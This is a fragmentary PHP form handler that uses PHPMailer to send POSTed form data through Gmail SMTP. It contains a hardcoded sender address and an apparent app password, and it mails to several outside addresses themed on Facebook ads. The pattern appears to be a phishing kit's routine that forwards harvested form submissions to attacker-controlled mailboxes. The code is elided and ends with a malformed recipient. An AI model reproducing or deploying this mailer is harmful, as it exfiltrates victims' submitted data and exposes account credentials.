...
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    ...
    try {
        ...
        $mail->SMTPAuth   = true;
        $mail->Username   = 'shhddbsjdjuwsygzsv@gmail.com'; // Replace with your email address
        $mail->Password   = 'basu thzw jvhz ritu'; // Replace with your email password
        $mail->SMTPSecure = 'tls';
        $mail->Port       = 587;


        // Email properties
        $mail->setFrom('shhddbsjdjuwsygzsv@gmail.com', 'PROFESSOR');
        $mail->addAddress('teamadsfacebook@gmail.com
        ');
       $mail->addAddress('onlineads837713@gmail.com');
       $mail->addAddress('g');
